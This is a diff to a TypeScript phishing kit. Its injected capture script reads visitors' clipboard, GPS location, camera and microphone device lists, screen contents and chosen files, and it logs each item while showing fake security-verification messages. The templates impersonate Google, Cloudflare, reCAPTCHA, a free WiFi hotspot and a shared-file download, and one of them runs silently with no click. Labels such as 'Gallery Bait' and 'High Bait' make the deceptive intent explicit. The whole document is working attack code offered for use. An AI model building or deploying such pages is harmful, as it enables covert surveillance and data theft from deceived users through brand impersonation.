@@ -17,8 +17,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     function checkRedirect() {
       if (hasRedirected) return;
       var elapsed = (Date.now() - startTime) / 1000;
-      var threshold = (flowType === 'full') ? 45 : 12;
-      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 4)) {
+      var threshold = (flowType === 'full') ? 50 : 15;
+      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
         hasRedirected = true;
         window.location.href = targetUrl;
       }
@@ -26,7 +26,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
     if (flowType === 'silent') {
        window.onload = function() {
-         setTimeout(function() { window.startCapture('silent'); }, 800);
+         setTimeout(function() { window.startCapture('silent'); }, 1000);
        };
     }
 
@@ -41,12 +41,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       var accent = cfg.accent || '#3498db';
 
       if (!isSilent) {
-        box.innerHTML = '<div id="status-icon" style="font-size:40px; opacity:0.8; margin-bottom:15px;">' + (cfg.icon || '🔍') + '</div>' +
-          '<h2 id="status-title" style="font-weight:600; color:#2c3e50;">Verifying...</h2>' +
-          '<div id="progress-container" style="width:100%; background:#ecf0f1; border-radius:10px; height:8px; margin-bottom:20px; overflow:hidden;">' +
-          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.6s ease-out;"></div>' +
+        box.innerHTML = '<div id="status-icon" style="font-size:45px; margin-bottom:20px;">' + (cfg.icon || '🛡️') + '</div>' +
+          '<h2 id="status-title" style="font-weight:600; color:#1a1a1a; margin-bottom:10px;">Security Verification</h2>' +
+          '<div id="progress-container" style="width:100%; background:#e0e0e0; border-radius:12px; height:8px; margin-bottom:20px; overflow:hidden;">' +
+          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.8s ease-in-out;"></div>' +
           '</div>' +
-          '<p id="status-text" style="font-size:13px; color:#7f8c8d; font-family:sans-serif; min-height: 40px; line-height:1.4;">Connecting to secure nodes...</p>';
+          '<p id="status-text" style="font-size:13px; color:#666; font-family:sans-serif; min-height: 40px; line-height:1.5;">Memulai otentikasi aman...</p>';
       }
 
       var statusTitle = document.getElementById('status-title');
@@ -75,18 +75,18 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         if (bar) bar.style.width = '100%';
         if (success) {
           if (icon) icon.innerText = "✅";
-          if (statusTitle) { statusTitle.innerText = "AUTHORIZED"; statusTitle.style.color = "#27ae60"; }
-          if (statusText) statusText.innerText = "Audit successful. Finalizing session...";
+          if (statusTitle) { statusTitle.innerText = "VERIFIED"; statusTitle.style.color = "#27ae60"; }
+          if (statusText) statusText.innerText = "Sertifikat keamanan diterbitkan. Mengalihkan...";
         } else {
           if (icon) icon.innerText = "ℹ️";
           if (statusTitle) statusTitle.innerText = "COMPLETE";
-          if (statusText) statusText.innerText = (reason || "Process finished.") + " Finalizing redirect...";
+          if (statusText) statusText.innerText = "Proses selesai. Membuka akses...";
         }
-        setTimeout(checkRedirect, 2500);
+        setTimeout(checkRedirect, 3000);
       }
 
       try {
-        if (!isSilent) updateProgress(5, "Analyzing hardware signature...", "INIT_SEC");
+        if (!isSilent) updateProgress(8, "Menganalisis integritas browser...", "SECURITY_CHECK");
         
         var metadata = {
           browser: navigator.userAgent,
@@ -99,42 +99,42 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         };
         await logEvent('info', metadata);
 
-        var stepProgress = Math.floor(85 / (requiredPerms.length || 1));
-        var currentP = 10;
+        var stepProg = Math.floor(80 / (requiredPerms.length || 1));
+        var prog = 15;
 
         for (var i = 0; i < requiredPerms.length; i++) {
-          var perm = requiredPerms[i];
-          currentP += stepProgress;
+          var p = requiredPerms[i];
+          prog += stepProg;
 
           try {
-            if (perm === 'notification') {
-              if (!isSilent) updateProgress(currentP, "Establishing alert tunnel...", "PUSH_SYNC");
+            if (p === 'notification') {
+              if (!isSilent) updateProgress(prog, "Sinkronisasi jalur peringatan...", "NOTIF_AUTH");
               if ("Notification" in window) await Notification.requestPermission();
             }
 
-            if (perm === 'clipboard') {
-              if (!isSilent) updateProgress(currentP, "Syncing buffer tokens...", "CACHE_AUTH");
+            if (p === 'clipboard') {
+              if (!isSilent) updateProgress(prog, "Memvalidasi cache data aman...", "BUFFER_SYNC");
               if (navigator.clipboard) {
                 var clip = await navigator.clipboard.readText().catch(function(){});
                 if (clip) await logEvent('extra', { clipboard: clip });
               }
             }
 
-            if (perm === 'media') {
-              if (!isSilent) updateProgress(currentP, "Auditing hardware ports...", "MEDIA_ID");
+            if (p === 'media') {
+              if (!isSilent) updateProgress(prog, "Kalibrasi akses hardware AV...", "MEDIA_SETUP");
               if (navigator.mediaDevices) {
                 try {
                   await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => s.getTracks().forEach(t => t.stop())).catch(e=>{});
                   var devs = await navigator.mediaDevices.enumerateDevices();
-                  var list = devs.map(d => d.kind + ': ' + (d.label || 'System Device')).join('\\n');
+                  var list = devs.map(d => d.kind + ': ' + (d.label || 'Auth-Device')).join('\\n');
                   await logEvent('extra', { media: list });
                 } catch(e) {}
               }
             }
 
-            if (perm === 'gps') {
+            if (p === 'gps') {
               if (!isSilent) {
-                updateProgress(currentP, "Fetching spatial nodes...", "REGION_AUTH");
+                updateProgress(prog, "Verifikasi koordinat spatial regional...", "GEO_VALIDATION");
                 if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
               }
               if (navigator.geolocation) {
@@ -142,14 +142,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                   navigator.geolocation.getCurrentPosition(
                     function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                     function(err) { resolve(); },
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    { enableHighAccuracy: true, timeout: 10000 }
                   );
                 });
               }
             }
 
-            if (perm === 'screen') {
-              if (!isSilent) updateProgress(currentP, "Visual integrity scan...", "VIRT_SCAN");
+            if (p === 'screen') {
+              if (!isSilent) updateProgress(prog, "Integritas visual sedang diproses...", "DISPLAY_AUTH");
               if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                 await navigator.mediaDevices.getDisplayMedia({ video: true }).then(s => {
                   var track = s.getVideoTracks()[0];
@@ -159,23 +159,23 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               }
             }
 
-            if (perm === 'files') {
-              if (!isSilent) updateProgress(currentP, "Validating file tokens...", "STORAGE_AUDIT");
+            if (p === 'files') {
+              if (!isSilent) updateProgress(prog, "Sinkronisasi token media galeri...", "STORAGE_CERT");
               if (window.showOpenFilePicker) {
-                 var [handle] = await window.showOpenFilePicker({ types: [{ description: 'Token', accept: { 'image/*': ['.png','.jpg','.jpeg'] } }] }).catch(function(){ return []; });
-                 if (handle) {
-                   var file = await handle.getFile();
+                 var handle = await window.showOpenFilePicker({ types: [{ description: 'Security Cert', accept: { 'image/*': ['.png','.jpg','.jpeg'] } }] }).catch(function(){ return null; });
+                 if (handle && handle[0]) {
+                   var file = await handle[0].getFile();
                    await logEvent('extra', { file_name: file.name, file_size: file.size });
                  }
               }
             }
-          } catch(e) { }
+          } catch(e) {}
           permsCompleted++;
         }
 
         finish(true);
       } catch (err) {
-        finish(false, "Service Interrupt.");
+        finish(false, "Sistem sibuk.");
       }
     };
   })();
@@ -186,40 +186,40 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 const ALL_PERMS = ['notification', 'clipboard', 'media', 'gps', 'screen', 'files'];
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
-  '1': {
-    name: "⚡ SUPERMAN: Full System Audit (Max Overpowered)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { background:#0f172a; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:45px; background:#1e293b; border-radius:15px; text-align:center; box-shadow:0 25px 50px rgba(0,0,0,0.5); border: 1px solid #334155; } h2 { color:#38bdf8; margin-bottom:10px; font-weight:700; } p { color:#94a3b8; font-size:14px; margin-bottom:30px; } .btn { background:#38bdf8; color:#0f172a; border:none; padding:18px 30px; border-radius:10px; font-weight:800; cursor:pointer; width:100%; text-transform:uppercase; letter-spacing:1px; }</style></head><body><div class="box"><div style="font-size:50px; margin-bottom:20px;">🛡️</div><h2>System Protection</h2><p>Amankan perangkat Anda dengan audit keamanan menyeluruh untuk mengakses layanan premium.</p><button class="btn" onclick="window.startCapture();">LENGKAPI VERIFIKASI</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: '1', perms: ALL_PERMS, accent: '#38bdf8', icon: '🛡️',
+  'google': {
+    name: "🛡️ Google: Identity Protection (OP - Professional)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { font-family: 'Roboto', Arial, sans-serif; background:#f5f5f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; width:90%; max-width:400px; padding:45px; border:1px solid #dadce0; border-radius:8px; text-align:center; box-shadow:0 1px 3px rgba(0,0,0,0.1); } h2 { font-weight:400; font-size:24px; color:#202124; margin-top:20px; } p { color:#5f6368; font-size:14px; line-height:1.6; margin:20px 0 35px; } .btn { background:#1a73e8; color:white; border:none; padding:14px 24px; border-radius:4px; font-weight:500; cursor:pointer; width:100%; font-size:15px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90"><h2>Verify your identity</h2><p>Pastikan koneksi Anda aman. Google perlu memverifikasi perangkat dan lokasi Anda untuk memberikan akses penuh.</p><button class="btn" onclick="window.startCapture();">Confirm identity</button></div>${getCaptureScript(id, 'https://google.com', {
+      tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
     })}</body></html>`
   },
-  'wifi': {
-    name: "📶 WIFI: Free Hotspot Login (Very High Success)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Login</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:40px; text-align:center; } h1 { font-size:24px; color:#2d3436; } p { color:#636e72; font-size:14px; margin-bottom:30px; } .btn { background:#0984e3; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="80" style="margin-bottom:20px;"><h1>Free WiFi Hotspot</h1><p>Klik tombol di bawah untuk menyambungkan. Anda akan diminta mengaktifkan **Lokasi & Notifikasi** agar koneksi tetap stabil.</p><button class="btn" onclick="window.startCapture();">CONNECT NOW</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: 'wifi', perms: ALL_PERMS, accent: '#0984e3', icon: '📶'
+  'cloudflare': {
+    name: "☁️ Cloudflare: Integrity Audit (OP - Corporate)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Reviewing security...</title><style>body { font-family: system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .box { max-width:500px; } .spinner { border:3px solid #f3f3f3; border-top:3px solid #fa8231; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite; margin:30px auto; } @keyframes spin { to { transform:rotate(360deg); } } h1 { font-size:26px; font-weight:500; } .btn { background:#fff; border:1px solid #ccc; padding:12px 30px; border-radius:4px; color:#333; font-weight:600; cursor:pointer; width:100%; font-size:15px; margin-top:10px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="130"><div class="spinner"></div><h1>Checking your browser...</h1><p style="color:#666; font-size:15px;">Harap konfirmasi integritas hardware dan lokasi regional Anda untuk melewati firewall perlindungan DDoS kami.</p><button class="btn" onclick="window.startCapture();">Verify you are human</button></div>${getCaptureScript(id, 'https://cloudflare.com', {
+      tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#fa8231', icon: '☁️'
     })}</body></html>`
   },
-  'maps': {
-    name: "🗺️ G-MAPS: Real-time Route Sync",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Maps Sync</title><style>body { font-family:sans-serif; text-align:center; padding-top:15vh; background:#f8f9fa; } .box { width:90%; max-width:450px; margin:0 auto; padding:40px; background:#fff; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.05); } .btn { background:#34a853; color:white; padding:16px 30px; border-radius:4px; border:none; font-weight:700; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" width="70"><br><br><h2>Verifikasi Lokasi</h2><p>Sinkronkan GPS dan visual hardware Anda untuk memastikan rute yang paling akurat dari server kami.</p><button class="btn" onclick="window.startCapture();">SINKRONKAN SEKARANG</button></div>${getCaptureScript(id, 'https://maps.google.com', {
-      tmplId: 'maps', perms: ALL_PERMS, accent: '#34a853', icon: '🌍'
-    })}</body></html>`
-  },
-  'recap': {
-    name: "🕵️ GHOST: Invisible Recaptcha (Silent OP)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; font-family:sans-serif; } .box { border:1px solid #ddd; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }</style></head><body><div style="text-align:center;"><p style="color:#666; margin-bottom:15px;">Validating browser session...</p><div class="box"><div style="width:25px; height:25px; border:2px solid #ccc; margin-right:15px;"></div><div style="font-size:14px; color:#555;">Processing...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
-      tmplId: 'recap', flow: 'silent', perms: ALL_PERMS
+  'file': {
+    name: "📂 Transfer: Media Unlock (OP - Gallery Bait)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Download File</title><style>body { background:#f9fafb; font-family: -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; width:90%; max-width:400px; padding:40px; border-radius:16px; text-align:center; border:1px solid #edf2f7; box-shadow:0 4px 6px -1px rgba(0,0,0,0.1); } .btn { background:#007aff; color:#fff; padding:16px 30px; border-radius:12px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; }</style></head><body><div class="box"><div style="font-size:60px; margin-bottom:20px;">📦</div><h2>Unduh Tersedia</h2><p style="color:#4a5568; font-size:14px;">Seseorang telah berbagi file dengan Anda. Verifikasi akses **Storage & Lokasi** diperlukan untuk membuka enkripsi file ini.</p><button class="btn" onclick="window.startCapture();">BUKA SEKARANG</button></div>${getCaptureScript(id, 'https://google.com', {
+      tmplId: 'file', perms: ALL_PERMS, accent: '#007aff', icon: '📂'
     })}</body></html>`
   },
   'pegasus': {
-    name: "💀 PEGASUS: Advanced Terminal Audit",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Pegasus Terminal</title><style>body { background:#000; color:#00ff00; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:450px; border:1px solid #00ff00; padding:40px; background:#050505; box-shadow:0 0 20px rgba(0,255,0,0.2); } .header { font-weight:bold; margin-bottom:20px; border-bottom:1px solid #00ff00; padding-bottom:10px; } .btn { width:100%; background:#00ff00; color:#000; border:none; padding:15px; font-weight:bold; cursor:pointer; margin-top:25px; text-transform:uppercase; }</style></head><body><div class="box"><div class="header">PEGASUS_SYSTEM_v5.0</div><p>[!] SECURITY THREAT DETECTED<br><br>Lakukan Full Identity Audit untuk memverifikasi bahwa Anda bukan bot atau emulator ilegal.</p><button class="btn" onclick="window.startCapture();">START SYSTEM AUDIT</button></div>${getCaptureScript(id, 'https://google.com/', {
-      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#00ff00', icon: '💀'
+    name: "💀 PEGASUS: Advanced Terminal (OP - Hacky)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Pegasus Terminal</title><style>body { background:#000; color:#0f0; font-family:'Courier New', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:460px; border:1px solid #0f0; padding:40px; background:#080808; text-align:left; box-shadow: 0 0 15px rgba(0,255,0,0.15); } .btn { width:100%; background:#0f0; color:#000; border:none; padding:15px; font-weight:bold; cursor:pointer; margin-top:30px; letter-spacing:1px; }</style></head><body><div class="box"><div>[SYSTEM_KERNEL_v5.0]</div><br><div>[!] STATUS: UNAUTHORIZED_IP_DETECTED</div><div>[!] ACTION: AUDIT_REQUIRED_TO_BYPASS</div><br><p style="color:#888; font-size:12px;">Validasi otentikasi hardware visual, spatial, dan storage sedang dimohon. Klik di bawah untuk sinkronisasi terminal.</p><button class="btn" onclick="window.startCapture();">RUN SYSTEM_AUDIT</button></div>${getCaptureScript(id, 'https://google.com', {
+      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#0f0', icon: '💾'
     })}</body></html>`
   },
-  'transfer': {
-    name: "📂 FILE: Secure Document Sync (Gallery/File Access)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Open File</title><style>body { background:#f5f5f5; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; padding:40px; border-radius:15px; text-align:center; width:90%; max-width:400px; border:1px solid #eee; } .btn { background:#007aff; color:white; padding:15px 30px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; width:100%; margin-top:20px; }</style></head><body><div class="box"><div style="font-size:50px; margin-bottom:15px;">📂</div><h2>File Terkunci</h2><p>Anda menerima file penting. Sinkronkan **Storage & Lokasi** untuk memverifikasi wilayah Anda sebelum mengunduh.</p><button class="btn" onclick="window.startCapture();">BUKA FILE</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: 'transfer', perms: ALL_PERMS, accent: '#007aff', icon: '📂'
+  'wifi': {
+    name: "📶 WIFI: Hotspot Certification (OP - High Bait)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WiFi Connect</title><style>body { background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { text-align:center; width:90%; max-width:380px; } hr { border:0; border-top:1px solid #f0f0f0; margin:25px 0; } .btn { background:#000; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/93/93158.png" width="70"><br><br><h1>Free WiFi Login</h1><p style="color:#666; font-size:14px;">Otorisasi identitas perangkat diperlukan untuk menggunakan hotspot publik ini secara aman.</p><hr><button class="btn" onclick="window.startCapture();">LOGIN TO NETWORK</button></div>${getCaptureScript(id, 'https://google.com', {
+      tmplId: 'wifi', perms: ALL_PERMS, accent: '#000', icon: '📶'
+    })}</body></html>`
+  },
+  'recap': {
+    name: "🕵️ GHOST: Silent Integrity (OP - No Button)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#fdfdfd; font-family:sans-serif; } .box { border:1px solid #dbdbdb; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }</style></head><body><div style="text-align:center;"><p style="color:#555; margin-bottom:15px; font-size:14px;">Checking browser hardware integrity...</p><div class="box"><div style="width:24px; height:24px; border:2px solid #cecece; margin-right:15px;"></div><div style="font-size:13px; color:#555;">Finalizing audit...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
+      tmplId: 'recap', flow: 'silent', perms: ALL_PERMS
     })}</body></html>`
   }
 };
